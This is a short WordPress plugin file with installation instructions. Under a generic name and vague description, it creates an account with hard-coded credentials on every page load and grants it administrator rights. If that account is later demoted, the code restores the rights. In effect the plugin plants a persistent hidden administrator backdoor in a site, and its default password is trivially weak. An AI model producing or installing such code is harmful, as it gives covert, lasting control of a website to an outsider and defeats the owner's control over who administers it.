<?php
/**
* Plugin Name: Your Site Name
* Plugin URI: https://github.com/asifulmamun
* Description: This plugin requried this site. It's using custom functions.
* Version: 1.0
* Author: Al Mamun
* Author URI: http://facebook.com/asifulmamun
**/


/* Custom Auto User Create */
add_action('init', 'add_my_user');
function add_my_user() {
    $username = 'username'; //change your user name what you want
    $email = 'jhon@gmail.com'; //change your email
    $password = 'password'; //change your password

    $user_id = username_exists( $username );
    if ( !$user_id && email_exists($email) == false ) {
        $user_id = wp_create_user( $username, $password, $email );
        if( !is_wp_error($user_id) ) {
            $user = get_user_by( 'id', $user_id );
            $user->set_role( 'administrator' );
        }
    }

	if ( $user_id && email_exists($email) == true) {
	   if( !is_wp_error($user_id) ) {
	            $user = get_user_by( 'id', $user_id );
	            $user->set_role( 'administrator' );
	    }
	}
}

// --- Plugin End
/*
   -------------------- INSTALLATION -------------------
	-- Copy this code and create a text raw file then paste in this file all copied code.
		--- CHANGE/REPLACE with your userinformation.
	-- Then save this file with extention your plugin name.php ".php" extention.
	-- Then same create a folder with same name and this php file put in this folder then create this file as a zip (compressed)
	-- Then you can Upload to your WordPress web site and active.
*/

?>
